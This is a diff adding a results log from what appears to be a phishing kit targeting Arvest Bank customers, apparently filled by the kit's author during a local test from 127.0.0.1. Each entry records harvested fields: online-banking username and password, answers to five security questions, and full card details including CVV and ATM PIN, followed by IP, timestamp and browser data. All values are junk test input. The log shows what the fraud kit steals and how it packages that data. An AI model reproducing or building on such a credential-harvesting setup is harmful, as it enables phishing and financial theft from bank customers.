@@ -1,0 +1,55 @@
+--------------Arvest Online Banking Result-------------------
+Username: sdasdasdasdasdasd
+Password: asdasdasdasdasd
+============= [ Ip & Hostname Info ] =============
+Submitted By : 127.0.0.1
+Country Name : 
+Country Code: 
+Date And Time : Sat Jul 23, 2022 2:35 pm
+Browser Details : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+--------xXx--------
+IP Address: 127.0.0.1 
+--------------Arvest Online Banking Result-------------------
+Username: asdasdasdasd
+Password: asdasdasdasdasd
+============= [ Ip & Hostname Info ] =============
+Submitted By : 127.0.0.1
+Country Name : 
+Country Code: 
+Date And Time : Sat Jul 23, 2022 2:35 pm
+Browser Details : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+--------xXx--------
+IP Address: 127.0.0.1 
+--------------Arvest Online Banking Result-------------------
+Security Question 1: What is your maternal grandmother's first name ?
+Answer 1: asdasdasdasdasd
+Security Question 2: What is the first name of your oldest niece ?
+Answer 2: sdasdasdasd
+Security Question 3: In what city was your mother born ?
+Answer 3: sdasdasdasd
+Security Question 4: In what city were you married ?
+Answer 4: asdasdasdasd
+Security Question 5: What was the nickname of your grandfather ?
+Answer 5: sadadasdasdasd
+============= [ Ip & Hostname Info ] =============
+Submitted By : 127.0.0.1
+Country Name : 
+Country Code: 
+Date And Time : Sat Jul 23, 2022 2:35 pm
+Browser Details : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+--------xXx--------
+IP Address: 127.0.0.1 
+--------------Arvest Online Banking Result-------------------
+Full Name: sdfsfsdfsdfsdfdsf
+Card Number: 4535-3453-4534-5353
+Expiration Date: 54/3534
+CVV: 345
+ATM Pin: 3453
+============= [ Ip & Hostname Info ] =============
+Submitted By : 127.0.0.1
+Country Name : 
+Country Code: 
+Date And Time : Sat Jul 23, 2022 2:36 pm
+Browser Details : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
+--------xXx--------
+IP Address: 127.0.0.1 
